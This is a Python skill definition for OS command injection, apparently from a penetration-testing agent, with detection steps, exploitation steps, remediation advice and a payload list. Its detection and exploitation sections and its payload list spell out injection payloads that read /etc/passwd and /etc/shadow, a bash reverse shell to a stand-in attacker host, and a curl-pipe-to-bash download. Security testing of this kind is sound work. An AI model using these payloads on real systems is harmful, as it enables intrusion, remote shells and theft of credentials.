"""OS Command Injection."""

SKILL = {
    "id": "command_injection",
    "name": "OS Command Injection",
    "category": "injection",
    "severity": "critical",

    "detection": """
- Look for features that interact with the OS: ping, traceroute, DNS lookup, file operations
- Test inputs that might be passed to shell commands
- Inject command separators: ; | & || && ` $() %0a
- Test: 127.0.0.1; id  or  127.0.0.1 | cat /etc/passwd
- Test blind injection with time delays: ; sleep 5
- Test blind injection with DNS: ; nslookup attacker.com
- Test with URL encoding: %3B%20id (;id)
- Check for input fields: hostname, IP address, filename, email (if processed by shell)
- Test newline injection: %0a%0d in parameters
- Test backtick execution: `id` or $(id)
""",

    "exploitation": """
- Execute arbitrary commands as web server user: ; id; whoami; uname -a
- Read sensitive files: ; cat /etc/passwd; cat /etc/shadow
- Establish reverse shell:
  ; bash -i >& /dev/tcp/attacker/4444 0>&1
  ; python3 -c 'import socket,subprocess,os;...'
- Download and execute tools: ; curl attacker.com/tool | bash
- Access database: ; mysql -u root -e 'show databases'
- Pivot to internal network
- Document: show output of id, whoami, or file contents as proof
""",

    "remediation": """
- NEVER pass user input to shell commands
- Use language-specific libraries instead of shell:
  Python: subprocess.run(['ping', '-c', '1', ip], shell=False) NOT os.system('ping ' + ip)
  Node.js: child_process.execFile('ping', ['-c', '1', ip]) NOT exec('ping ' + ip)
- If shell is unavoidable: strict allowlist validation (only alphanumeric + dots for IPs)
- Use shlex.quote() in Python to escape shell arguments
- Never use eval(), exec(), system() with user input
- Run web application with minimal OS privileges (not root)
- Use containers/sandboxes to limit blast radius
- Enable SELinux/AppArmor to restrict process capabilities
- SSH fix: review code for os.system(), exec(), backtick usage
- SSH fix: replace with safe subprocess calls
- Verify: test injection payloads again, confirm no execution
""",

    "tools": ["nmap_scan", "http_headers_check", "web_spider", "waf_detect", "tech_fingerprint"],

    "payloads": [
        "; id", "| id", "& id", "|| id", "&& id",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "`id`", "$(id)", "; sleep 5", "| sleep 5",
        "%0a id", "%0a%0d id", "; whoami",
        "127.0.0.1; id", "127.0.0.1 | id",
        "; uname -a", "$(cat /etc/passwd)",
    ],

    "references": [
        "OWASP A03:2021 - Injection",
        "CWE-78: OS Command Injection",
        "CAPEC-88: OS Command Injection",
    ],
}
